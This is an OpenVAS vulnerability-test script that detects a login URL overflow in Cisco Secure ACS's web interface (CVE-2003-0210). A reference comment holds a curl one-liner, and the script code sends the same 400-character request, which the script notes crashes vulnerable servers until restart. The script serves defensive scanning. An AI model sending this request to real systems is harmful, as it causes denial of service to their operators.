# OpenVAS Vulnerability Test
# $Id: cisco_acs_web_overflow.nasl 17 2013-10-27 14:01:43Z jan $
# Description: CISCO Secure ACS Management Interface Login Overflow
#
# Authors:
# Xue Yong Zhi <xueyong@udel.edu>
#
# Copyright:
# Copyright (C) 2003 Xue Yong Zhi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It may be possible to make this Cisco Secure ACS web
server(login.exe) execute arbitrary code by sending
it a too long login url.";

tag_solution = "Cisco has already released a patch for this problem";

# References:
# NSFOCUS SA2003-04
# curl -i "http://host:2002/login.exe?user=`perl -e "print ('a'x400)"`&reply=any&id=1"

if(description)
{
 script_id(11556);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(7413);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-2003-0210");
 
 name = "CISCO Secure ACS Management Interface Login Overflow";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_description(desc);
 
 summary = "CISCO Secure ACS Management Interface Login Overflow";
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK); 
 
 script_copyright("This script is Copyright (C) 2003 Xue Yong Zhi");
 family = "CISCO";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www",2002);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

ports = add_port_in_list(list:get_kb_list("Services/www"), port:2002);
foreach port (ports)
{
 if(http_is_dead(port:port) == 0 )
 {
 if(is_cgi_installed_ka(port:port, item:"/login.exe"))
  {
  req = string("/login.exe?user=", crap(400), "&reply=any&id=1");
  req = http_get(item:req, port:port);
  http_keepalive_send_recv(port:port, data:req);

  #The request will make a vunerable server suspend until a restart
  if(http_is_dead(port:port)) {
	security_hole(port);
	exit(0);
	}
  }
 }
}
